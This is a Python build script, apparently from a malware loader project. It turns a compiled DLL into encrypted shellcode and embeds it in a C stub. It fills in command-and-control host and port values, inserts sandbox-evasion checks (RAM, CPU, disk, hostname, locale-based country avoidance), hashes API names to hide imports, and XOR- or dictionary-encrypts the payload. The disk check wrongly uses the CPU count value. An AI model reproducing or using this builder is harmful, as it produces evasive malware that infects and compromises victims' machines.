from scripts.templating import *
from scripts.hasher import *
from scripts.utils import *
from scripts.dict import dictionary_encrypt

from configparser import ConfigParser
import random
import sys

config = ConfigParser()
config.read(".conf") 


def is_set(value):
    return value != None and value != ""

VERBOSE = False
PRIORIZE_SIZE = False

ENCRYPTION_METHOD = config.get("Payload", "encryption_method", fallback="").strip()

if len(sys.argv) > 1:
    VERBOSE = sys.argv[1].lower() == "true"
if len(sys.argv) > 2:
    PRIORIZE_SIZE = sys.argv[2].lower() == "true"


if ENCRYPTION_METHOD == "xor":
    if config.get("Payload", "encryption_key") == "random":
        ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
    else:
        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
elif ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
    ENCRYPTION_KEY = 1
else:
    sys.exit("Error: Invalid encryption method specified in the configuration (.conf) file.\nValid options are 'xor', 'dictionary', or 'dict'.")

# C2 infos
LHOST = config.get("Payload", "lhost") if is_set(config.get("Payload", "lhost")) else None
LPORT = config.getint("Payload", "lport") if is_set(config.get("Payload", "lport")) else None

DISK_SIZE = config.get("Anti-Analysis", "disk_size")
RAM_SIZE = config.get("Anti-Analysis", "ram_size")
CPU_COUNT = config.get("Anti-Analysis", "cpu_cores")

TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")

AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
if len(AVOID_HOSTNAME) <= 1 and AVOID_HOSTNAME[0] == "":
    AVOID_HOSTNAME = []

AVOID_COUNTRIES = config.get("Anti-Analysis", "avoid_countries").split(",")
if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
    AVOID_COUNTRIES = []

WORKING_FOLDER = "build/"
STUB_FILE = "main.c"
PAYLOAD_NAME = "injected-dll.dll"
PAYLOAD_FILE = "payload.txt"

def main():

    if PRIORIZE_SIZE:
        # if no stdlib -> use custom functions & remove pointless ones
        sed_files(WORKING_FOLDER, "int WinMain(", "int WinMainCRTStartup(")


    print("===========PAYLOAD==============") if VERBOSE else None

    all_tags = extract_tags_from_folder(WORKING_FOLDER)

    for file in all_tags:
        filename = file["filename"]
        tags = file["tags"]
        
        if VERBOSE:
            print(f"Processing {filename} with tags {tags}")
        # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
        for tag in tags:
            parts = tag.replace("%", "").split("__")
            if len(parts) == 1:
                if parts[0] == "LHOST":
                    sed_file(WORKING_FOLDER+filename, tag, LHOST)
                elif parts[0] == "LPORT":
                    sed_file(WORKING_FOLDER+filename, tag, str(LPORT))
            if parts[0] == "MODHASH": # definitions.c
                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],"", VERBOSE))
            elif parts[0] == "FCTHASH": # definitions.c
                sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1], VERBOSE))
            elif parts[0] == "SANDBOX":
                if parts[1] == "RAM_CHECK":
                    if is_set(RAM_SIZE):
                        template = get_template("RAM_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", RAM_SIZE))
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")
                elif parts[1] == "CPU_CHECK":
                    if is_set(CPU_COUNT):
                        template = get_template("CPU_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")
                elif parts[1] == "DISK_CHECK":
                    if is_set(CPU_COUNT):
                        template = get_template("DISK_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")
                elif parts[1] == "COUNTRY_CHECK":
                    if len(AVOID_COUNTRIES):
                        template = get_template("COUNTRY_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template)
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")

                # ------OLD----------
                if parts[1] == "DISKSIZE":
                    sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
                if parts[1] == "TARGET_HOSTNAME":
                    if len(TARGET_HOSTNAME):
                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME, VERBOSE))
                        print("Target hostname: ", TARGET_HOSTNAME) if VERBOSE else None
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
                if parts[1] == "AVOID_HOSTNAME":
                    if len(AVOID_HOSTNAME):
                        res = ""
                        for hostname in AVOID_HOSTNAME:
                            if hostname != "":
                                res += hash_obj("",hostname, VERBOSE)+","
                        sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                        print("Avoid hostnames: ", AVOID_HOSTNAME) if VERBOSE else None
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
                if parts[1] == "AVOID_COUNTRIES":
                    if len(AVOID_COUNTRIES):
                        res = ""
                        for country in AVOID_COUNTRIES:
                            if country != "":
                                ids = get_LCID(country)
                                for id in ids:
                                    res += str(hex(id))+","
                        sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                        print("Avoid countriess: ", AVOID_COUNTRIES) if VERBOSE else None
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}

    compile_dll()

    instructions = dll2instructions()
    with open(WORKING_FOLDER+PAYLOAD_FILE, "w") as f:
        f.write(str(instructions))

    print("================================\n") if VERBOSE else None



    # Encrypt the shellcode
    print("===========ENCRYPTION==============") if VERBOSE else None
    
    if ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
        print(f"\nEncrypted with dictionary\n") if VERBOSE else None
        instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions, VERBOSE)

        sed_files(WORKING_FOLDER, "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
        sed_files(WORKING_FOLDER, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
        sed_files(WORKING_FOLDER, "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
    
    else:
        print(instructions[:32]+"...")
        print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n") if VERBOSE else None
        encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
        print(encrypted_instructions[:32]+"...") if VERBOSE else None

        sed_files(WORKING_FOLDER, "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
        sed_files(WORKING_FOLDER, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
        sed_files(WORKING_FOLDER, "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
    
    print("===================================\n") if VERBOSE else None
    sed_files(WORKING_FOLDER, "%XOR_KEY%", str(ENCRYPTION_KEY))

    

    print("\n================COMPILATION===============") if VERBOSE else None


if __name__ == "__main__":
    main()